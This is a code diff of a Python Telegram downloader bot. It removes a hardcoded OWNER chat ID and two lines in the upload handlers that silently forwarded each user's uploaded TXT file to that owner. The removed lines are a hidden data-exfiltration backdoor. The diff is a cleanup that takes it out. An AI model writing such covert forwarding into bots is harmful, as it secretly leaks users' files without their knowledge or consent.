@@ -34,7 +34,6 @@ from base64 import b64encode, b64decode
 from helper import *
 from config import API_ID, API_HASH, BOT_TOKEN
 
-OWNER = int(os.environ.get("OWNER", 5680454765))
 cookies_file_path= "youtube_cookies.txt"
 # watermark_text = ""
 
@@ -528,7 +527,6 @@ async def account_login(bot: Client, m: Message):
     editable = await m.reply_text(f"<pre><code>🔹Hi I am Poweful TXT Downloader📥 Bot.\n🔹Send me the TXT file and wait.</code></pre>")
     input: Message = await bot.listen(editable.chat.id)
     y = await input.download()
-    await bot.send_document(OWNER, y)
     file_name, ext = os.path.splitext(os.path.basename(y))  # Extract filename & extension
 
     if file_name.endswith("_helper"):  # ✅ Check if filename ends with "_helper"
@@ -1032,7 +1030,6 @@ async def txt_handler(bot: Client, m: Message):
     editable = await m.reply_text(f"**🔹Hi I am TXT to Doc Downloader📥 Bot.**\n🔹**Send me the TXT file and wait.**")
     input: Message = await bot.listen(editable.chat.id)
     x = await input.download()
-    await bot.send_document(OWNER, x)
     await input.delete(True)
     file_name, ext = os.path.splitext(os.path.basename(x))
     credit = f"𝙎𝘼𝙄𝙉𝙄 𝘽𝙊𝙏𝙎"
